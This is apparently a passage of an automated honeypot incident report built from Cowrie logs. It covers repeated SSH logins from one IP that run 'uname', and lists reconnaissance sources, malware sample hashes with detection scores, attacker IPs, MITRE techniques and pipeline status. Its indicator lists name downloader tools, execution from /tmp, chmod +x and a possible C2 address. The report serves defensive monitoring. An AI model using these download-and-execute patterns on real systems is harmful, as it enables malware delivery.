| `2026-08-23 12:54:05` | `cowrie.command.input` |
| `2026-08-23 12:54:05` | `cowrie.log.closed` |
| `2026-08-23 12:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abfbcefc364e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:09` | `cowrie.session.connect` |
| `2026-08-23 12:54:09` | `cowrie.client.version` |
| `2026-08-23 12:54:09` | `cowrie.client.kex` |
| `2026-08-23 12:54:09` | `cowrie.login.success` |
| `2026-08-23 12:54:10` | `cowrie.session.params` |
| `2026-08-23 12:54:10` | `cowrie.command.input` |
| `2026-08-23 12:54:10` | `cowrie.log.closed` |
| `2026-08-23 12:54:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-226bed9f0107

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:14` | `cowrie.session.connect` |
| `2026-08-23 12:54:14` | `cowrie.client.version` |
| `2026-08-23 12:54:14` | `cowrie.client.kex` |
| `2026-08-23 12:54:14` | `cowrie.login.success` |
| `2026-08-23 12:54:15` | `cowrie.session.params` |
| `2026-08-23 12:54:15` | `cowrie.command.input` |
| `2026-08-23 12:54:15` | `cowrie.log.closed` |
| `2026-08-23 12:54:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deec3e847bca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:19` | `cowrie.session.connect` |
| `2026-08-23 12:54:19` | `cowrie.client.version` |
| `2026-08-23 12:54:19` | `cowrie.client.kex` |
| `2026-08-23 12:54:20` | `cowrie.login.success` |
| `2026-08-23 12:54:20` | `cowrie.session.params` |
| `2026-08-23 12:54:20` | `cowrie.command.input` |
| `2026-08-23 12:54:20` | `cowrie.log.closed` |
| `2026-08-23 12:54:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-409c75f35345

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:24` | `cowrie.session.connect` |
| `2026-08-23 12:54:24` | `cowrie.client.version` |
| `2026-08-23 12:54:24` | `cowrie.client.kex` |
| `2026-08-23 12:54:25` | `cowrie.login.success` |
| `2026-08-23 12:54:25` | `cowrie.session.params` |
| `2026-08-23 12:54:25` | `cowrie.command.input` |
| `2026-08-23 12:54:25` | `cowrie.log.closed` |
| `2026-08-23 12:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72e5f1ebf05d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:29` | `cowrie.session.connect` |
| `2026-08-23 12:54:29` | `cowrie.client.version` |
| `2026-08-23 12:54:29` | `cowrie.client.kex` |
| `2026-08-23 12:54:30` | `cowrie.login.success` |
| `2026-08-23 12:54:30` | `cowrie.session.params` |
| `2026-08-23 12:54:30` | `cowrie.command.input` |
| `2026-08-23 12:54:31` | `cowrie.log.closed` |
| `2026-08-23 12:54:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f660bdbd50a9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:34` | `cowrie.session.connect` |
| `2026-08-23 12:54:34` | `cowrie.client.version` |
| `2026-08-23 12:54:34` | `cowrie.client.kex` |
| `2026-08-23 12:54:35` | `cowrie.login.success` |
| `2026-08-23 12:54:36` | `cowrie.session.params` |
| `2026-08-23 12:54:36` | `cowrie.command.input` |
| `2026-08-23 12:54:36` | `cowrie.log.closed` |
| `2026-08-23 12:54:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66fbb5c40611

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:39` | `cowrie.session.connect` |
| `2026-08-23 12:54:39` | `cowrie.client.version` |
| `2026-08-23 12:54:40` | `cowrie.client.kex` |
| `2026-08-23 12:54:40` | `cowrie.login.success` |
| `2026-08-23 12:54:41` | `cowrie.session.params` |
| `2026-08-23 12:54:41` | `cowrie.command.input` |
| `2026-08-23 12:54:41` | `cowrie.log.closed` |
| `2026-08-23 12:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96130634802e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:45` | `cowrie.session.connect` |
| `2026-08-23 12:54:45` | `cowrie.client.version` |
| `2026-08-23 12:54:45` | `cowrie.client.kex` |
| `2026-08-23 12:54:45` | `cowrie.login.success` |
| `2026-08-23 12:54:46` | `cowrie.session.params` |
| `2026-08-23 12:54:46` | `cowrie.command.input` |
| `2026-08-23 12:54:46` | `cowrie.log.closed` |
| `2026-08-23 12:54:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a95953c35e5f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:50` | `cowrie.session.connect` |
| `2026-08-23 12:54:50` | `cowrie.client.version` |
| `2026-08-23 12:54:50` | `cowrie.client.kex` |
| `2026-08-23 12:54:50` | `cowrie.login.success` |
| `2026-08-23 12:54:51` | `cowrie.session.params` |
| `2026-08-23 12:54:51` | `cowrie.command.input` |
| `2026-08-23 12:54:51` | `cowrie.log.closed` |
| `2026-08-23 12:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2918f1a74d2e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:54 |
| **Last Seen** | 2026-08-23 12:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:54:55` | `cowrie.session.connect` |
| `2026-08-23 12:54:55` | `cowrie.client.version` |
| `2026-08-23 12:54:55` | `cowrie.client.kex` |
| `2026-08-23 12:54:56` | `cowrie.login.success` |
| `2026-08-23 12:54:57` | `cowrie.session.params` |
| `2026-08-23 12:54:57` | `cowrie.command.input` |
| `2026-08-23 12:54:57` | `cowrie.log.closed` |
| `2026-08-23 12:54:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-418835cb6e93

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]35` |
| **First Seen** | 2026-08-23 12:55 |
| **Last Seen** | 2026-08-23 12:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 12:55:00` | `cowrie.session.connect` |
| `2026-08-23 12:55:00` | `cowrie.client.version` |
| `2026-08-23 12:55:00` | `cowrie.client.kex` |
| `2026-08-23 12:55:00` | `cowrie.login.success` |
| `2026-08-23 12:55:02` | `cowrie.session.params` |
| `2026-08-23 12:55:02` | `cowrie.command.input` |
| `2026-08-23 12:55:02` | `cowrie.log.closed` |
| `2026-08-23 12:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]35` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `92.204.128[.]149` | **16** | 2026-08-23 10:58 | 2026-08-23 12:46 | 8m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **4** | 2026-08-23 11:14 | 2026-08-23 12:31 | 0m | 0 | `T1592` | 🟢 LOW |
| `93.170.78[.]27` | **3** | 2026-08-23 12:51 | 2026-08-23 12:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.118.209[.]123` | **2** | 2026-08-23 12:42 | 2026-08-23 12:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `209.178.152[.]150` | **2** | 2026-08-23 11:53 | 2026-08-23 11:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.230.92[.]29` | **2** | 2026-08-23 11:00 | 2026-08-23 11:01 | 0m | 0 | `T1592` | 🟢 LOW |
| `31.148.20[.]129` | **2** | 2026-08-23 12:54 | 2026-08-23 12:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `37.53.61[.]221` | **2** | 2026-08-23 12:54 | 2026-08-23 12:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]179` | **2** | 2026-08-23 12:00 | 2026-08-23 12:25 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.219.32[.]239` | 1 | 2026-08-23 11:17 | 2026-08-23 11:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.246.89[.]68` | 1 | 2026-08-23 12:33 | 2026-08-23 12:33 | 4s | 0 | `T1592` | 🟢 LOW |
| `136.169.36[.]120` | 1 | 2026-08-23 11:05 | 2026-08-23 11:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.189.209[.]18` | 1 | 2026-08-23 11:28 | 2026-08-23 11:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.64.211[.]93` | 1 | 2026-08-23 12:15 | 2026-08-23 12:15 | 8s | 0 | `T1592` | 🟢 LOW |
| `46.59.108[.]174` | 1 | 2026-08-23 11:10 | 2026-08-23 11:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.59.88[.]179` | 1 | 2026-08-23 12:05 | 2026-08-23 12:07 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.59.91[.]138` | 1 | 2026-08-23 11:32 | 2026-08-23 11:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]40` | 1 | 2026-08-23 11:50 | 2026-08-23 11:50 | 18s | 0 | `T1592` | 🟢 LOW |
| `80.216.156[.]131` | 1 | 2026-08-23 12:47 | 2026-08-23 12:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.92.47[.]35` | 1 | 2026-08-23 12:44 | 2026-08-23 12:45 | 8s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/75** 🔴 |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260821-001551-338449f07075-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `93.170.78[.]27` | UA | PROLVL Ltd. | **100** ⚠️ | 3 |
| `136.169.36[.]120` | LV | SIA BITE Latvija | **100** ⚠️ | 0 |
| `165.99.71[.]193` | ID | PT RING DATA PRIMA | **100** ⚠️ | 0 |
| `213.230.92[.]29` | UZ | Uzbektelekom Joint Stock Company | **100** ⚠️ | 3 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `31.41.84[.]98` | PL | Telekom System sp.z o.o. | **100** ⚠️ | 50 |
| `183.223.156[.]154` | CN | China Mobile Communications Corporation | **100** ⚠️ | 31 |
| `217.60.255[.]130` | IR | SepehrSabz IDC | **100** ⚠️ | 4 |
| `103.219.32[.]239` | CN | Hangzhou Sulian Information Technology Co.,ltd | **100** ⚠️ | 40 |
| `14.153.252[.]114` | CN | CHINANET Guangdong province network | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 205 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 195 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 20 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 20 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 18 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 6 |
| AbuseIPDB score 13 below threshold 25 | 1 |
| AbuseIPDB score 22 below threshold 25 | 3 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 3 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 262 cases |
| Tool 34  | Credential Extractor        | ✅ 218 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
